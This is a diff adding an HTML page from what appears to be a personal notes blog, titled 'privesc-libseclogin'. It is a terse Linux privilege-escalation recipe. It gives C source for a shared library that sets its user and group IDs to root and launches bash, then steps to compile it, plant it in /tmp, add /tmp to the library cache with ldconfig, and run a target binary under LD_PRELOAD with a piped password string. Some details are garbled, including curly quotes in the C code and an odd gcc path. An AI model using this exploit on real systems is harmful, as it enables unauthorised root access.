@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet">
+
+        <title>privesc-libseclogin</title>
+
+        <link rel="stylesheet" href="css/stylesheet.css">
+    </head>
+    <body>
+        <section id="page-title">
+            <h1><a href="/">Notes</a></h1>
+        </section>
+
+
+
+<section class="blog-post">
+    <h1>privesc-libseclogin</h1>
+    <div class="blog-post-subheader">
+        December 17, 2018
+    </div>
+    <div class="blog-post-content">
+        
+
+<p>touch libseclogin.c
+<pre>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <sys/types.h>
+void seclogin()
+{
+        setuid(0);
+        setgid(0);
+        execl(&ldquo;/bin/bash&rdquo;,&ldquo;sh&rdquo;,(char *)0);
+}
+int main(void)
+{
+        seclogin();
+}
+</pre></p>
+
+<h1 id="compile-the-code-with">Compile the code with</h1>
+
+<p>/usr/share/bash-completion/completions/gcc -shared -o libseclogin.so -fPIC libseclogin.c</p>
+
+<p>cp libseclogin.so to /tmp</p>
+
+<p>cd /etc/ld.so.conf.d
+ldconfig test.conf
+#(test.conf write /tmp)
+#it will give this output</p>
+
+<h1 id="sbin-ldconfig-real-relative-path-test-conf-used-to-build-cache">/sbin/ldconfig.real: relative path `test.conf&rsquo; used to build cache</h1>
+
+<p>env LD_LIBRARY_PATH=/tmp LD_PRELOAD=/tmp/libseclogin.so strace echo &lsquo;s3cur3l0g1n&rsquo; | /usr/bin/myexec</p>
+
+    </div>
+</section>
+
+    </body>
+</html>
